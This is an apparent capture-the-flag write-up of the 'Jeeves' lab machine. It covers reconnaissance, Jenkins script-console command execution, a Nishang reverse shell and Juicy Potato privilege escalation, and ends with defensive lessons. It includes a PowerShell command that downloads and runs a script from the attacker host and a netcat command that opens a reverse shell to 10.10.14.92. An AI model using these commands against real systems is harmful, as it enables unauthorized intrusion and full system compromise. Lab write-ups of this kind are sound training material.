# Jeeves

## Reconnaissance <a href="#491d" id="491d"></a>

First we want to run a initial nmap scan to see what ports are open and what services are on those ports.

```hcl
nmap -sC -sV -oA nmap/init 10.129.174.184
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-oA**: output all formats to _nmap/initial_

We get back the following information:

{% code title="init.nmap" %}
```hcl
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 20:19 EDT
Nmap scan report for 10.129.174.184
Host is up (0.034s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-24T05:19:57
|_  start_date: 2022-03-24T05:08:21
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.19 secondshcl
```
{% endcode %}

## Enumeration

### Passive Enumeration

#### IIS Directory Enumeration

```bash
gobuster dir -u http://10.129.174.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o iis.txt
```

#### Jetty Directory Enumeration

```
gobuster dir -u http://10.129.174.184:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o iis.txt
```

### Active Enumeration

#### Exploring IIS

Looking at the http site we are presented with a search bar

![](<../../../.gitbook/assets/image (15).png>)

Searching takes you to error.html which turns out to just be an image

![error.html](<../../../.gitbook/assets/image (17).png>)

Source code for site, the action results in error.html

```html
<!DOCTYPE html>
<html>
<head>
<title>Ask Jeeves</title>
<link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
<form class="form-wrapper cf" action="error.html">
    <div class="byline"><p><a href="#">Web</a>, <a href="#">images</a>, <a href="#">news</a>, and <a href="#">lots of answers</a>.</p></div>
  	<input type="text" placeholder="Search here..." required>
	  <button type="submit">Search</button>
    <div class="byline-bot">Skins</div>
</form>
</body>

</html>
```

#### Exploring Jetty

Quickly checking gobuster for jetty shows that we have a directory to check out

![/askjeeves](<../../../.gitbook/assets/image (16).png>)

Going there we see Jenkins!

![Jenkins](<../../../.gitbook/assets/image (24).png>)

Turns out we have command execution without needing to be logged in which works in our favor

![](<../../../.gitbook/assets/image (7).png>)

## Initial Access

Using Nishang Invoke-PowerShellTcp.ps1 script we can create a reverse shell and get access to the box

{% embed url="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" %}

First we want to copy the example to the bottom of the script so that it is run when copied to the machine we are attacking

![](<../../../.gitbook/assets/image (10).png>)

![](<../../../.gitbook/assets/image (6).png>)

Next we want to get a web server running and a netcat listener to catch the reverse shell. In this se I am using [updog](https://github.com/sc0tfree/updog) for my simple web server.

![](<../../../.gitbook/assets/image (12).png>)

Using the script console again I run this command to download and execute the invoke powershell tcp reverse shell script

![](<../../../.gitbook/assets/image (3).png>)

And we get a shell back!

![](<../../../.gitbook/assets/image (14).png>)

This allows us to get user.txt!

## Privilege Escalation

### Juicy Potato

Next we want to run PowerUp.ps1 however we want to use the dev branch as it has extra checks

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/dev" %}

![](<../../../.gitbook/assets/image (13).png>)

Then we want to run these commands in our reverse shell

```powershell
IEX(New-Object Net.WebCLient).downloadString('http://10.10.14.92/PowerUp.ps1')
Invoke-AllChecks # This runs the powershell function to check everything
```

![](<../../../.gitbook/assets/image (2).png>)

Right away we see SeImpersonatePrivilege which means this box is vulnerable to Juicy Potato!

{% embed url="https://github.com/ohpe/juicy-potato" %}

We first need to download JuicyPotato.exe to the box which I am hosting from my kali box

![](<../../../.gitbook/assets/image (22).png>)

We need to copy kali's nc.exe to the windows box

```powershell
# nc.exe is located /usr/share/windows-resources/binaries/nc.exe on kali
Invoke-WebRequest "http://10.10.14.92/nc.exe" -OutFile "nc.exe"
```

![](<../../../.gitbook/assets/image (8).png>)

Next we want to run JuicyPotato!

This is the input I used:

* **-t: \***
* **-p:** c:\windows\system32\cmd.exe
* **-a:** "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.92 9001"
* **-l:** 9001

```powershell
cmd /c jp.exe -l 9001 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.92 9001" -t *
```

![Got a shell](<../../../.gitbook/assets/image (23).png>)

We got nt authority\system!&#x20;

When we try and take a look at the administrators desktop we see hm.txt with an interesting message

![](<../../../.gitbook/assets/image (5).png>)

Then I tried this

![Alternate Data Streams](<../../../.gitbook/assets/image (9).png>)

Alternate Data Streams, find more about them here

{% embed url="https://owasp.org/www-community/attacks/Windows_alternate_data_stream" %}

<details>

<summary>We can direct this into more and get the flag</summary>

```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a606 # Only first 16 bytes of hash shown
```

</details>

## Lessons Learned

* Restrict who can access the Jenkins management as this opens up unauthorized access
* In some instances a file using alternate data streams could be an indicator of compromise
* Be careful of which service users have SeImpersonatePrivilege as this could allow an attacker to easily escelate their privileges&#x20;
